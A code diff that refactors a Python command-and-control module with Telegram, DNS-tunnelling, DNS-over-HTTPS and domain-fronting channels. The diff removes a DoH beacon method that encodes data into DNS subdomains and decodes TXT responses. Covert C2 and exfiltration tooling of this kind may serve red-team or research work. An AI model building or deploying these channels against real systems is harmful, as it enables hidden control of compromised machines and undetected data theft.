@@ -30,11 +30,14 @@ from enum import Enum
 from typing import Any
 
 # Optional: True Steganography Support
+REQUESTS_AVAILABLE = False
 try:
     import io
     import zlib
 
     import requests
+
+    REQUESTS_AVAILABLE = True
 except ImportError:
     pass
 
@@ -224,6 +227,8 @@ class TelegramC2:
 
     def _request(self, method: str, params: dict | None = None) -> dict:
         try:
+            if not REQUESTS_AVAILABLE:
+                return {"ok": False, "error": "requests library not installed"}
             url = f"{self.base_url}/{method}"
             # Re-using aiohttp or requests if available
             resp = requests.post(url, data=params, timeout=10)
@@ -571,9 +576,10 @@ class DNSTunneler:
         encoded = encoded.rstrip("=").lower()
 
         # Split into labels of max length
-        labels = []
-        for i in range(0, len(encoded), self.subdomain_length):
-            labels.append(encoded[i : i + self.subdomain_length])
+        labels = [
+            encoded[i : i + self.subdomain_length]
+            for i in range(0, len(encoded), self.subdomain_length)
+        ]
 
         return labels
 
@@ -701,9 +707,10 @@ class DNSTunneler:
             List of data chunks
 
         """
-        chunks = []
-        for i in range(0, len(data), chunk_size):
-            chunks.append(data[i : i + chunk_size])
+        chunks = [
+            data[i : i + chunk_size]
+            for i in range(0, len(data), chunk_size)
+        ]
         return chunks
 
 
@@ -959,39 +966,7 @@ class DoHTransport:
             logger.exception("DoH transport error: %s", e)
             return False, []
 
-    def send_beacon(self, data: bytes) -> tuple[bool, bytes]:
-        """Send beacon data via DoH encoded in subdomain.
 
-        Args:
-            data: Data to send (will be base32 encoded)
-
-        Returns:
-            Tuple of (success, response_data)
-
-        """
-        # Encode data as base32 subdomain
-        encoded = base64.b32encode(data).decode("ascii").rstrip("=").lower()
-
-        # Split into valid DNS labels (max 63 chars each)
-        labels = []
-        for i in range(0, len(encoded), 50):
-            labels.append(encoded[i : i + 50])
-
-        subdomain = ".".join(labels)
-
-        success, responses = self.query(subdomain, "TXT")
-
-        if success and responses:
-            # Decode response (assuming base32)
-            try:
-                response_encoded = "".join(responses).upper()
-                padding = (8 - len(response_encoded) % 8) % 8
-                response_encoded += "=" * padding
-                return True, base64.b32decode(response_encoded)
-            except Exception:
-                return True, "\n".join(responses).encode()
-
-        return success, b""
 
 
 # =============================================================================
@@ -1421,29 +1396,6 @@ class C2Channel:
 # =============================================================================
 # MODULE-LEVEL FUNCTIONS
 # =============================================================================
-
-_c2_channel: C2Channel | None = None
-
-
-def get_c2_channel(config: C2Config | None = None) -> C2Channel:
-    """Get or create C2 channel singleton.
-
-    Args:
-        config: C2 configuration (required for first call)
-
-    Returns:
-        C2Channel instance
-
-    """
-    global _c2_channel
-
-    if _c2_channel is None:
-        if config is None:
-            config = C2Config()
-        _c2_channel = C2Channel(config)
-
-    return _c2_channel
-
 
 def create_fronted_channel(
     fronting_domain: str,
